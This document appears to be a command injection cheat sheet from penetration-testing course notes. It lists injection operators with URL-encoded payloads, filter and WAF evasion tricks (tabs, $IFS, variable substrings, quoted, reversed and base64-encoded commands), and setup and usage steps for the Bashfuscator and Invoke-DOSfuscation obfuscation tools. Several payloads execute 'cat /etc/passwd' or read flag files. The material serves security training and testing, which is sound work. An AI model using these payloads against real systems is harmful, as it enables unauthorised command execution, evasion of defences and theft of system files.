## 1. Injection Operators

When injecting commands, use these operators to separate the injected command from the original one.

| Operator | Character | URL-Encoded | Executed Command | OS |
| :--- | :--- | :--- | :--- | :--- |
| **Semicolon** | `;` | `%3b` | Both | Linux / Windows (PS) |
| **New Line** | `\n` | `%0a` | Both | Both |
| **Background** | `&` | `%26` | Both (second output generally shown first) | Both |
| **Pipe** | `\|` | `%7c` | Both (only second output is shown) | Both |
| **AND** | `&&` | `%26%26` | Both (only if first succeeds) | Both |
| **OR** | `\|\|` | `%7c%7c` | Second (only if first fails) | Both |
| **Sub-Shell** | `` ` `` | `%60%60` | Both | Linux |
| **Sub-Shell** | `$()` | `%24%28%29` | Both | Linux |

*Example Payload Format:*
`127.0.0.1%0awhoami` (using New Line `%0a`)

## 2. Filter Evasion: Blacklisted Characters

### Bypassing Space Filters

If spaces are blocked (e.g., `invalid input` on space), replace them with:

* **Tabs:** Replace space with `%09`
  * *Payload:* `127.0.0.1%0a%09whoami`
* **$IFS (Linux):** Environment variable that defaults to space/tab.
  * *Payload:* `127.0.0.1%0a${IFS}whoami`
* **Brace Expansion (Linux):** Bash automatically adds spaces between arguments.
  * *Payload:* `127.0.0.1%0a{ls,-la}`

### Bypassing Slashes (`/` or `\`)

* **Linux Environment Variables:** Substring expansion on variables containing slashes.
  * Get `/`: `${PATH:0:1}` (Assuming first char of `$PATH` is `/`)
  * *Payload example:* `ls${IFS}${PATH:0:1}home` (equivalent to `ls /home`)
* **Linux Character Shifting:** Shift ASCII value of `[` (91) to `\` (92).
  * Get `\`: `$(tr '!-}' '"-~'<<<[)`
* **Windows CMD Variables:**
  * Get `\`: `echo %HOMEPATH:~6,-11%` (Offsets vary based on username length)
* **Windows PowerShell Variables:**
  * Get `\`: `$env:HOMEPATH[0]`

### Bypassing Semicolons (`;`)

* **Linux:** `${LS_COLORS:10:1}` (Check `printenv` for variables containing `;` and adjust the index).

## 3. Filter Evasion: Blacklisted Commands

If the specific command word (like `whoami` or `cat`) is blocked, use these obfuscation techniques.

### Quotes & Ignored Characters (Basic)

* **Linux & Windows (Quotes):** Insert single or double quotes (must be an even number, do not mix types).
  * `w'h'o'am'i`
  * `w"h"o"am"i`
* **Linux Only (Ignored Chars):** Insert `\` or `$@`.
  * `who$@ami`
  * `w\ho\am\i`
* **Windows Only (Carets):** Insert `^`.
  * `who^ami`

## 4. Advanced Command Obfuscation

For hardened filters and WAFs. Remember to replace spaces with `%09` if spaces are filtered!

### Case Manipulation

* **Windows (CMD/PS):** Natively case-insensitive.
  * `WhOaMi`
* **Linux (Bash):** Case-sensitive. Use `tr` or parameter expansion to lowercase the command string.
  * *Method 1:* `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
  * *Method 2:* `$(a="WhOaMi";printf "%s" "${a,,}")`

### Reversed Commands

Reverse the command to evade signature detection, then execute it reversed.

* **Linux:**
  * *Prep locally:* `echo 'whoami' | rev` (Output: `imaohw`)
  * *Execution Payload:* `$(rev<<<'imaohw')`
* **Windows (PowerShell):**
  * *Prep locally:* `"whoami"[-1..-20] -join ''` (Output: `imaohw`)
  * *Execution Payload:* `iex "$('imaohw'[-1..-20] -join '')"`

### Encoded Commands (Base64)

Encode payloads to remove filtered characters (like spaces, slashes, pipes), then decode in a sub-shell and pass to the executor.

* **Linux:**
  1. *Encode locally:* `echo -n 'cat /etc/passwd | grep 33' | base64`
     (Output: `Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==`)
  2. *Execution Payload:* `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
     *(Note: Using `<<<` avoids the filtered pipe `|` character).*
* **Windows (PowerShell):**
  1. *Encode locally (UTF-16LE):* `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
     (Output: `dwBoAG8AYQBtAGkA`)
  2. *Execution Payload:* `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

## 5. Automated Evasion Tools

When manual methods fail, use these tools to generate highly obfuscated payloads.

### Linux: Bashfuscator

* **Setup:**
  ```python
  git clone https://github.com/Bashfuscator/Bashfuscator
  cd Bashfuscator
  pip3 install setuptools==65
  python3 setup.py install --user
  ```
* **Usage (Simplified Payload):**
  ```python
  ./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
  ```

### Windows: DOSfuscation

* **Setup:**
  ```python
  git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
  cd Invoke-DOSfuscation
  Import-Module .\Invoke-DOSfuscation.psd1
  Invoke-DOSfuscation
  ```
* **Usage:** Interactive menu.
  ```python
  Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
  Invoke-DOSfuscation> encoding
  Invoke-DOSfuscation\Encoding> 1
  ```
  *(Note: Runs in PowerShell, but generates `cmd.exe` payloads. Can be run on Linux using `pwsh`).*
